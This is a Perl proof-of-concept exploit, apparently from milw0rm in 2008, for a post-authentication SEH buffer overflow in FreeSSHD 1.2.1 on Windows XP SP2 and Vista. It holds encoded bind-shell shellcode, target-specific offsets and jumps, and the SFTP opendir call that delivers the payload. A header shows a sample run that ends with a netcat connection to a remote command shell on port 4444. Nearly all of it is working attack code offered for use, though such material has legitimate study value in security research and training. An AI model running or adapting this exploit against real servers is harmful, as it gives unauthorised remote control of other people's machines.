#!/usr/bin/perl
###############################################################################
#   FreeSSHD 1.2.1 (Post Auth) Remote Seh Overflow http://freeddsshd.com/     #
#    Exploit based on securfrog Poc http://www.milw0rm.com/exploits/5709      #
#                                                                             #
#                  Coded by Matteo Memelli aka ryujin                         #
#                        `Spaghetti & PwnSauce`                               #
#         >> http://www.be4mind.com  http://www.gray-world.net <<             #
#                                                                             #
#         Tested on Windows XPSp2 EN / Windows Vista Ultimate EN              #
#      Offset for SEH overwrite is 3 Bytes greater in Windows Vista           #                   
#                   Reliable Exploitation needs SSC :)                        #                   
#                                                                             #
#          `I Miss Python but...I Gotta learn some perl too ;)`               #
#            `Cheers to #offsec friends and to my bro s4tan`                  #
###############################################################################
#                                                                             # 
# bt POCS # ./freeSSHD_exploit.pl 10.150.0.228 22 pwnme pwnme 2               #
# [+] FreeSSHD 1.2.1 (Post Auth) Remote Seh Overflow                          #
# [+] Coded by Matteo Memelli aka ryujin                                      #
# [+] SSC: Stack Spring Cleaning... >> rm thisJunk <<                         #
# [+] Exploiting FreSSHDService...                                            #
# [+] Sending Payload...                                                      #
# [*] Done! CTRL-C and check your shell on port 4444                          #
#                                                                             #
# bt POCS # nc 10.150.0.228 4444                                              #
# Microsoft Windows [Version 6.0.6000]                                        #
# Copyright (c) 2006 Microsoft Corporation.  All rights reserved.             #
#                                                                             #
# C:\Users\ryujin\Desktop>                                                    #
#                                                                             #
###############################################################################

use strict;
use Net::SSH2;

my $numArgs = $#ARGV + 1;
if ($numArgs != 5) {
   print "Usage : ./freeSSHD_exploit.pl HOST PORT USER PASS TARGET\n";
   print "TARGET: 1 -> XPSP2\n";
   print "TARGET: 2 -> VISTA\n";
   exit;
}

# [*] Using Msf::Encoder::PexAlphaNum with final size of 709 bytes 
# ExitFunc=SEH
my $shellcode = 
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49".
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36".
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x46\x4b\x4e".
"\x4d\x54\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x36\x4b\x48".
"\x4e\x56\x46\x42\x46\x32\x4b\x38\x45\x44\x4e\x33\x4b\x48\x4e\x47".
"\x45\x50\x4a\x37\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x31\x4b\x58".
"\x4f\x55\x42\x52\x41\x30\x4b\x4e\x49\x44\x4b\x48\x46\x33\x4b\x38".
"\x41\x30\x50\x4e\x41\x53\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c".
"\x46\x47\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e".
"\x46\x4f\x4b\x33\x46\x55\x46\x32\x4a\x42\x45\x37\x45\x4e\x4b\x48".
"\x4f\x35\x46\x42\x41\x30\x4b\x4e\x48\x46\x4b\x48\x4e\x50\x4b\x34".
"\x4b\x48\x4f\x45\x4e\x31\x41\x50\x4b\x4e\x43\x50\x4e\x42\x4b\x58".
"\x49\x48\x4e\x46\x46\x32\x4e\x41\x41\x36\x43\x4c\x41\x53\x4b\x4d".
"\x46\x56\x4b\x48\x43\x34\x42\x43\x4b\x58\x42\x44\x4e\x30\x4b\x48".
"\x42\x37\x4e\x41\x4d\x4a\x4b\x48\x42\x54\x4a\x50\x50\x45\x4a\x36".
"\x50\x38\x50\x54\x50\x50\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x46".
"\x43\x35\x48\x46\x4a\x46\x43\x43\x44\x53\x4a\x46\x47\x57\x43\x37".
"\x44\x33\x4f\x35\x46\x55\x4f\x4f\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e".
"\x4e\x4f\x4b\x43\x42\x55\x4f\x4f\x48\x4d\x4f\x55\x49\x58\x45\x4e".
"\x48\x36\x41\x58\x4d\x4e\x4a\x50\x44\x50\x45\x55\x4c\x36\x44\x50".
"\x4f\x4f\x42\x4d\x4a\x36\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x45".
"\x4f\x4f\x48\x4d\x43\x35\x43\x35\x43\x45\x43\x35\x43\x35\x43\x54".
"\x43\x35\x43\x54\x43\x35\x4f\x4f\x42\x4d\x48\x46\x4a\x46\x41\x31".
"\x4e\x35\x48\x56\x43\x35\x49\x48\x41\x4e\x45\x39\x4a\x36\x46\x4a".
"\x4c\x51\x42\x37\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x36\x42\x31".
"\x41\x55\x45\x35\x4f\x4f\x42\x4d\x4a\x46\x46\x4a\x4d\x4a\x50\x32".
"\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x55\x45\x45\x4f\x4f\x42\x4d".
"\x4a\x56\x45\x4e\x49\x34\x48\x58\x49\x54\x47\x35\x4f\x4f\x48\x4d".
"\x42\x45\x46\x45\x46\x45\x45\x45\x4f\x4f\x42\x4d\x43\x59\x4a\x46".
"\x47\x4e\x49\x37\x48\x4c\x49\x37\x47\x35\x4f\x4f\x48\x4d\x45\x45".
"\x4f\x4f\x42\x4d\x48\x46\x4c\x46\x46\x46\x48\x36\x4a\x36\x43\x56".
"\x4d\x46\x49\x58\x45\x4e\x4c\x56\x42\x55\x49\x55\x49\x32\x4e\x4c".
"\x49\x38\x47\x4e\x4c\x46\x46\x34\x49\x38\x44\x4e\x41\x33\x42\x4c".
"\x43\x4f\x4c\x4a\x50\x4f\x44\x54\x4d\x42\x50\x4f\x44\x44\x4e\x52".
"\x43\x39\x4d\x58\x4c\x47\x4a\x43\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36".
"\x44\x37\x50\x4f\x43\x4b\x48\x51\x4f\x4f\x45\x37\x46\x54\x4f\x4f".
"\x48\x4d\x4b\x45\x47\x45\x44\x35\x41\x45\x41\x55\x41\x35\x4c\x46".
"\x41\x50\x41\x35\x41\x35\x45\x35\x41\x55\x4f\x4f\x42\x4d\x4a\x36".
"\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x56".
"\x4f\x4f\x4f\x4f\x47\x53\x4f\x4f\x42\x4d\x4b\x38\x47\x45\x4e\x4f".
"\x43\x48\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x35\x4f\x4f\x42\x4d".
"\x4a\x36\x42\x4f\x4c\x38\x46\x30\x4f\x35\x43\x35\x4f\x4f\x48\x4d".
"\x4f\x4f\x42\x4d\x5a";

my $nops      = "\x90"x64;
my $offset1xp = "\x41"x242;
my $offset1vi = "\x41"x226;
my $offset2xp = "\x41"x24;
my $offset2vi = "\x41"x43;
my $ppr       = "\xde\x13\x40";         
my $jmpsxp    = "\xeb\xe1\x90\x90";     
my $jmpsvi    = "\xeb\xce\x90\x90";     
my $jmpn      = "\xe9\x23\xfc\xff\xff"; 
my $ip        = $ARGV[0];
my $port      = int($ARGV[1]);
my $user      = $ARGV[2];
my $pass      = $ARGV[3];
my $payload   = '';
if ($ARGV[4] == '1')
{
   $payload = $nops.$shellcode.$offset1xp.$jmpn.$offset2xp.$jmpsxp.$ppr;
}
elsif ($ARGV[4] == '2')
{
   $payload = $nops.$shellcode.$offset1vi.$jmpn.$offset2vi.$jmpsvi.$ppr;  
}
else
{
   print "[-] TARGET ERROR!\n";
   exit;
}
print "[+] FreeSSHD 1.2.1 (Post Auth) Remote Seh Overflow\n";
print "[+] Coded by Matteo Memelli aka ryujin\n";
print "[+] SSC: Stack Spring Cleaning... >> rm thisJunk <<\n";
# If you start the exploit before any other connection, everything is fine
# otherwise exploit could become less reliable. 
# So let's rm some junk before exploiting our app...
for (my $count = 30; $count >= 1; $count--) {
   my $ssh2 = Net::SSH2->new();
   $ssh2->connect($ip, $port) || die "[-] Connnection Failed!";
   $ssh2->auth_password($user,$pass)|| die "Wrong Username or Passwd!";
   $ssh2->disconnect();
}
my $ssh2 = Net::SSH2->new();
$ssh2->connect($ip, $port) || die "[-] Connnection Failed!";
$ssh2->auth_password($user,$pass)|| die "Wrong Username or Passwd!";
print "[+] Exploiting FreSSHDService...\n";
print "[+] Sending Payload...\n";
print "[*] Done! CTRL-C and check your shell on port 4444\n";
my $sftp = $ssh2->sftp();
my $bad  = $sftp->opendir($payload);
exit;

# milw0rm.com [2008-06-06]
